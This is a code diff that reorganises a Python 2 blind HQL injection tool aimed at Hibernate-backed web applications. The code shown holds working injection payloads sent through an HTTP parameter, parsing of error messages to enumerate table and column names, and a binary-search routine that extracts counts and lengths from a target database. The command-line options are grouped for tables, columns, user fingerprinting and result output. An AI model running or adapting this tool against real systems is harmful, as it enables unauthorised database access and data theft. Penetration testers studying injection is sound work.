@@ -23,34 +23,9 @@ def send_HTTP_request(url, params):
     req = requests.get(url, headers=headers)
     return req
 
-def check_if_host_vulnerable(url, params, param_to_test):
-    params[param_to_test] = "'"
-
-    req = send_HTTP_request(url, params)
-    if ('org.hibernate.QueryException' in req.content):
-        print "Host seems vulnerable."
-    else:
-        raise Exception('No Query Exception in the HTTP response.')
-
-def list_columns(url, params, param_to_test):
-
-    global TABLES
-    columns = []
-    params[param_to_test] = "' and test=1 and ''='"
-
-    req = send_HTTP_request(url, params)
-    if ('not found; SQL statement' in req.content):
-        # pattern for the columns
-        pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
-        for res in re.findall(pattern, req.content):
-            table_name = res[1]
-            column_name = res[2]
-
-            insert_table_name_in_tables(table_name)
-            insert_column_in_table(table_name, column_name)
-    else:
-        raise Exception('We cannot manage to retrieve columns.')
-    
+###########################
+### Checker (exists ?) function
+###########################    
 
 def column_exists(message):
     if ('not found; SQL statement:' in message):
@@ -66,17 +41,14 @@ def table_exists(message):
     else:
         return True
 
-def enumerate_tables_and_columns():
-    global TABLES
+def check_if_host_vulnerable(url, params, param_to_test):
+    params[param_to_test] = "'"
 
-    display_message("[-] Enumerating extracted information")
-    for table in TABLES:
-        print "[" + table + "]"
-        for column in TABLES[table]:
-            print "\t" + column
-
-def remove_new_line_from_string(string, char=''):
-    return string[:-1] + char
+    req = send_HTTP_request(url, params)
+    if ('org.hibernate.QueryException' in req.content):
+        print "Host seems vulnerable."
+    else:
+        raise Exception('No Query Exception in the HTTP response.')
 
 ###########################
 ### Tables
@@ -180,6 +152,9 @@ def get_dbms_username(url, params, param, message):
     USER = username_str
     print "[!] Username of Database found : " + USER
 
+###########################
+### Count functions
+###########################
 
 def get_count_of_tables(url, params, param, message):
     global TABLES
@@ -200,7 +175,6 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
     sup = 10
 
     while (inf != sup):
-
         inf_str = '{:g}'.format(inf)
         sup_str = '{:g}'.format(sup)
 
@@ -210,7 +184,6 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
             params[param_to_test] = request + " = " + inf_str + " or ''='"    
         
         req = send_HTTP_request(url, params)
-
         if (message in req.content):
             break
     
@@ -220,7 +193,6 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
             params[param_to_test] = request + " >= " + sup_str + " or ''='"
 
         req = send_HTTP_request(url, params)
-
         if (message in req.content):
             inf = sup
             sup = (2 * inf)
@@ -229,6 +201,9 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
 
     return '{:g}'.format(inf)
 
+###########################
+### Insert table/Column utils
+###########################
 
 def insert_table_name_in_tables(table_name):
     global TABLES
@@ -257,6 +232,40 @@ def insert_column_in_table(table_name, column_name):
     else:
         display_message("[-] Column " + column_name + " has been found in table " + table_name + " (again)")
 
+###########################
+### Results functions
+###########################
+
+def list_columns(url, params, param_to_test):
+
+    global TABLES
+    columns = []
+    params[param_to_test] = "' and test=1 and ''='"
+
+    req = send_HTTP_request(url, params)
+    if ('not found; SQL statement' in req.content):
+        # pattern for the columns
+        pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
+        for res in re.findall(pattern, req.content):
+            table_name = res[1]
+            column_name = res[2]
+
+            insert_table_name_in_tables(table_name)
+            insert_column_in_table(table_name, column_name)
+    else:
+        raise Exception('We cannot manage to retrieve columns.')
+
+def enumerate_tables_and_columns():
+    global TABLES
+
+    display_message("[-] Enumerating extracted information")
+    for table in TABLES:
+        print "[" + table + "]"
+        for column in TABLES[table]:
+            print "\t" + column
+
+def remove_new_line_from_string(string, char=''):
+    return string[:-1] + char
 
 def display_message(message):
     global VERBOSE_MODE
@@ -268,27 +277,25 @@ parser = optparse.OptionParser()
 parser.add_option('--url', help='qURL to pentest', dest='url')
 parser.add_option('--param', help='Param to test', dest='param')
 parser.add_option('--cookie', help='Cookie to test it', dest='cookie', default=None)
-parser.add_option('--blind', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)
-parser.add_option('--table_name_file', help='Name for tables', dest='file_table', default='db/tables.db')
-parser.add_option('--column_name_file', help='Name for columns', dest='file_column', default='db/columns.db')
-parser.add_option('--fingerprinting', help='Gathers information by doing fingerprinting', dest='fingerprinting', default=False, action='store_true')
-parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
-parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')
+parser.add_option('--message', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)
 
 # Table options
 parser.add_option('--tables', help='Tries to gather as much tables as possible (With Bruteforce)', dest='tables', default=False, action='store_true')
 parser.add_option('--T', help='Name of the table you want to get', dest='table', default=None)
+parser.add_option('--table_name_file', help='Name for tables', dest='file_table', default='db/tables.db')
 
 # Column options
 parser.add_option('--columns', help='Tries to gather as much columns as possible (With Bruteforce)', dest='columns', default=False, action='store_true')
 parser.add_option('--C', help='Name of the column you want to get', dest='column', default=None)
+parser.add_option('--column_name_file', help='Name for columns', dest='file_column', default='db/columns.db')
 
 # Fingerprinting flag
 parser.add_option('--user', help='Tries to get user() from dbms', dest='user', default=False, action='store_true')
 parser.add_option('--count', help='Get count of specified table(s)', dest='count', default=False, action='store_true')
-# TODO: Check for mandatory parameters
-# mandatory params to check
-# mandatory_params = ['url', 'param']
+
+# Results options
+parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
+parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')
 
 if (len(sys.argv) <= 2):
     parser.print_help()
